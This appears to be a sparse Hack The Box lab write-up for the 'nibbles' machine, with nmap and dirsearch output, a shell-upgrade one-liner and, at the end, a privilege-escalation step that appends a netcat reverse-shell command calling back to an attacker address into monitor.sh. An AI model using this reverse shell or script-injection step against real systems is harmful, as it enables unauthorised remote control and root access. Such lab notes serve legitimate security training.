nmap
```
┌──(kali㉿kali)-[~/HTB/nibbles]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.255.237
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 22:33 EST
Warning: 10.129.255.237 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.255.237
Host is up (0.045s latency).
Not shown: 64388 closed tcp ports (reset), 1145 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Aggressive OS guesses: Linux 3.12 (96%), Linux 3.13 (96%), Linux 3.2 - 4.9 (96%), Linux 4.8 (96%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   45.92 ms 10.10.14.1
2   46.17 ms 10.129.255.237

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 615.59 seconds
```

```
┌──(kali㉿kali)-[~/HTB/nibbles]
└─$ dirsearch -u http://10.129.255.237/nibbleblog/  
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/nibbles/reports/http_10.129.255.237/_nibbleblog__25-01-05_22-48-47.txt

Target: http://10.129.255.237/

[22:48:47] Starting: nibbleblog/
[22:48:55] 403 -  311B  - /nibbleblog/.ht_wsr.txt                           
[22:48:55] 403 -  314B  - /nibbleblog/.htaccess.bak1                        
[22:48:56] 403 -  312B  - /nibbleblog/.htaccess_sc                          
[22:48:56] 403 -  314B  - /nibbleblog/.htaccess.orig
[22:48:56] 403 -  314B  - /nibbleblog/.htaccess.save                        
[22:48:56] 403 -  312B  - /nibbleblog/.htaccessBAK                          
[22:48:56] 403 -  312B  - /nibbleblog/.htaccessOLD                          
[22:48:56] 403 -  313B  - /nibbleblog/.htaccessOLD2
[22:48:56] 403 -  314B  - /nibbleblog/.htaccess_orig
[22:48:56] 403 -  305B  - /nibbleblog/.html
[22:48:56] 403 -  315B  - /nibbleblog/.htaccess_extra                       
[22:48:56] 403 -  314B  - /nibbleblog/.htpasswd_test                        
[22:48:56] 403 -  304B  - /nibbleblog/.htm                                  
[22:48:56] 403 -  310B  - /nibbleblog/.htpasswds
[22:48:56] 403 -  311B  - /nibbleblog/.httr-oauth                           
[22:48:56] 403 -  316B  - /nibbleblog/.htaccess.sample                      
[22:49:00] 403 -  304B  - /nibbleblog/.php                                  
[22:49:00] 403 -  305B  - /nibbleblog/.php3                                 
[22:49:18] 301 -  327B  - /nibbleblog/admin  ->  http://10.129.255.237/nibbleblog/admin/
[22:49:19] 200 -  606B  - /nibbleblog/admin.php                             
[22:49:20] 200 -  522B  - /nibbleblog/admin/                                
[22:49:21] 301 -  338B  - /nibbleblog/admin/js/tinymce  ->  http://10.129.255.237/nibbleblog/admin/js/tinymce/
[22:49:21] 200 -  569B  - /nibbleblog/admin/js/tinymce/
[22:50:01] 200 -  491B  - /nibbleblog/content/                              
[22:50:01] 301 -  329B  - /nibbleblog/content  ->  http://10.129.255.237/nibbleblog/content/
[22:50:02] 200 -  724B  - /nibbleblog/COPYRIGHT.txt                         
[22:50:38] 200 -   92B  - /nibbleblog/install.php                           
[22:50:39] 200 -   92B  - /nibbleblog/install.php?profile=default           
[22:50:43] 301 -  331B  - /nibbleblog/languages  ->  http://10.129.255.237/nibbleblog/languages/
[22:50:45] 200 -   12KB - /nibbleblog/LICENSE.txt                           
[22:51:14] 301 -  329B  - /nibbleblog/plugins  ->  http://10.129.255.237/nibbleblog/plugins/
[22:51:14] 200 -  700B  - /nibbleblog/plugins/                              
[22:51:20] 200 -    5KB - /nibbleblog/README                                
[22:51:49] 200 -  504B  - /nibbleblog/themes/                               
[22:51:50] 301 -  328B  - /nibbleblog/themes  ->  http://10.129.255.237/nibbleblog/themes/
[22:51:53] 200 -  815B  - /nibbleblog/update.php                            
                                                                             
Task Completed                           
```

![Pasted image 20250106115327](<0. Attachments/Pasted image 20250106115327.png>)

![Pasted image 20250106115346](<0. Attachments/Pasted image 20250106115346.png>)
![Pasted image 20250106115458](<0. Attachments/Pasted image 20250106115458.png>)

![Pasted image 20250106115734](<0. Attachments/Pasted image 20250106115734.png>)

upgrade shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

priv esc
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 > /tmp/f" >> monitor.sh
```

![Pasted image 20250106130716](<0. Attachments/Pasted image 20250106130716.png>)

![Pasted image 20250106130745](<0. Attachments/Pasted image 20250106130745.png>)